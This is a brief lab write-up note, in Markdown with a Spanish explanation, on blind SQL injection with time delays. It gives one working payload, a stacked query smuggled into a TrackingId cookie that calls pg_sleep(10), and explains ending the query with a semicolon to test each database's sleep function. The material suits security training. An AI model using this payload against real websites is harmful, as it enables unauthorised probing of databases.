---
title: "14 - Blind SQL injection with time delays"
---

# 14 - Blind SQL injection with time delays

```r
Cookie: TrackingId='%3b+SELECT+pg_sleep(10)--+-
```
insertamos un `;` para acabar la query y metemos una nueva probando las diferentes formas de dormir que tiene cada base de datos
